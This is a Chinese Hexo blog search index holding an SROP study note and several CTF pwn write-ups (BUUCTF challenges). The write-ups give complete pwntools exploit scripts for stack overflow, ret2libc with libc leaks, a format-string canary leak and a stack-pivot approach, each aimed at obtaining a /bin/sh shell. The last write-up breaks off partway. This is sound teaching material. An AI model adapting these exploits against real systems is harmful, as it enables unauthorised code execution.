<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SROP</title>
    <url>/2021/06/28/SROP/</url>
    <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
<p>Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&gt;rt_sigreturn</p>
<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息</p>
<p>常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态</p>
<p>因为是暂时被挂起，所以系统会保留该进程的上下文  (部分内容摘自ctf-wiki)</p>
<pre><code>将所有的寄存器压入栈中，以及signal信息和指向sigreturn的系统调用地址在栈顶上放置rt_sigreturn
</code></pre>
<p>此时栈上的内存分布：<br><img src="/img/14487175105930.png!small.jpg"></p>
<p>这一段内存也被称为<strong>Signal Frame</strong></p>
<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><pre><code>Signal Frame 被放置在用户进程的内存空间中，也就说Signal Frame是可以读写的

在恢复Signal信号的时候没有检测，也就是说我们可以通过改变Signal Frame中的信息来劫持控制流
</code></pre>
<p>例如：<br>  1  | rax = 59//对应59号系统调用-&gt; exceve<br>  2  | rdi = ‘/bin/sh’<br>  3  | rsi = 0<br>  4  | rdx = 0</p>
<p>这样就能进行一个最简单的Srop</p>
<h2 id="Srop链"><a href="#Srop链" class="headerlink" title="Srop链"></a>Srop链</h2><p>有时候我们希望执行一系列的操作,此时可以通过syscall ret;这个gadget去串联起我们我们的Srop链</p>
<p>执行完一个SignalFrame接着执行下一个SignalFrame。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>(HarekazeCTF2019)baby_rop(ret2text)</title>
    <url>/2021/06/20/%5BHarekazeCTF2019%5Dbaby_rop/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="HarekazeCTF2019-baby-rop-ret2text"><a href="#HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="[HarekazeCTF2019]baby_rop(ret2text)"></a>[HarekazeCTF2019]baby_rop(ret2text)</h2><p>查看保护机制，开了NX，64位</p>
<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
<p>IDA打开，F5查看main函数</p>
<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
<p>看见system函数</p>
<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>

<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(OGeek2019)babyrop(ret2libc)</title>
    <url>/2021/06/20/%5BOGeek2019%5Dbabyrop/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
<p>IDA打开查看发现有随机数问题</p>
<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
<p>通过strncmp函数比较随机数与输入数是否相等</p>
<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
<p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
<p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
<p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
<p>这里选择泄露write_addr，然后计算出system_addr</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>最后脚本一跑，拿到了flag</p>
<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>(HarekazeCTF2019)baby_rop2</title>
    <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
    <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
<p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
<p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
<p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
<p>3.最后将一二步合并完成夺权</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>泄露libc基址</p>
<p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rsi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
<p>看见rsi后面跟有r15，我们直接设置为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure>

<p>1.b‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>2.p64(pop_rdi)+p64(format_str)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>3.p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>4.p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>5.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  <span class="comment">#利用libcsearcher库去查找匹配的libc版本</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  <span class="comment">#计算程序里的偏移量</span></span><br></pre></td></tr></table></figure>

<p>计算system和(‘/bin/sh’)的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span>  <span class="comment">#%s所在字符串</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>blog诞生日2021.6.17</title>
    <url>/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</url>
    <content><![CDATA[<span id="more"></span>
<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop2</title>
    <url>/2021/07/18/bjdctf-2020-babyrop2/</url>
    <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
<p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
<p>init函数，初始化输出提示</p>
<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
<p>gift函数，存在格式化字符串漏洞</p>
<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
<p>vuln函数，存在栈溢出漏洞</p>
<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
<p><img src="/img/20200826223512973.png"></p>
<p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27304</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%7$p&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;u!&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_babyrop</title>
    <url>/2021/06/26/bjdctf-2020-babyrop/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
<p><img src="/img/image-20210626120953251.png" alt="image-20210626120953251"></p>
<p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
<p><img src="/img/image-20210626121205881.png" alt="image-20210626121205881"></p>
<p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png" alt="image-20210626121435224"></p>
<p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
<p><img src="/img/image-20210626121534041.png" alt="image-20210626121534041"></p>
<p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
<p><img src="/img/image-20210626122951905.png" alt="image-20210626122951905"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
<p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
<p>3.利用溢出漏洞，构造rop，夺权</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>先泄露libc，64位程序传参时需要用到寄存器</p>
<p>当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</p>
<p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/image-20210626122850728.png" alt="image-20210626122850728"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure>

<p>然后计算偏移量，算出system和/bin/sh的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后构造rop，夺权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25680</span>)</span><br><span class="line">elf=ELF(./bjdctf_2020_babyrop<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">context.log_level=&#x27;</span>debug<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">main=elf.sym[&#x27;</span>main<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">puts_plt=elf.plt[&#x27;</span>puts<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">puts_got=elf.got[&#x27;</span>puts<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">pop_rdi=0x400733</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">payload=b&#x27;</span>a<span class="string">&#x27;*(0x20+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>pull up your sword <span class="keyword">and</span> tell me u story!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">r.recv()</span></span><br><span class="line"><span class="string">puts_addr=u64(r.recv(6).ljust(8,&#x27;</span>\x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;</span>puts<span class="string">&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">offset=puts_addr-libc.dump(&#x27;</span>puts<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;</span>system<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">bin_sh=offset+libc.dump(&#x27;</span>str_bin_sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">payload=b&#x27;</span>a<span class="string">&#x27;*(0x20+8)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>pull up your sword <span class="keyword">and</span> tell me u story!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>

<p>最后拿到flag</p>
<p><img src="/img/image-20210626130027859.png" alt="image-20210626130027859"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_es_2</title>
    <url>/2021/06/28/ciscn-2019-es-2/</url>
    <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
<p>找到system函数真实地址0x8048400</p>
<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
<p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
<p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
<p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ebp=u32(r.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>2.找到s在栈上的位置</p>
<p>算出ebp-0x38是参数s在栈上的位置</p>
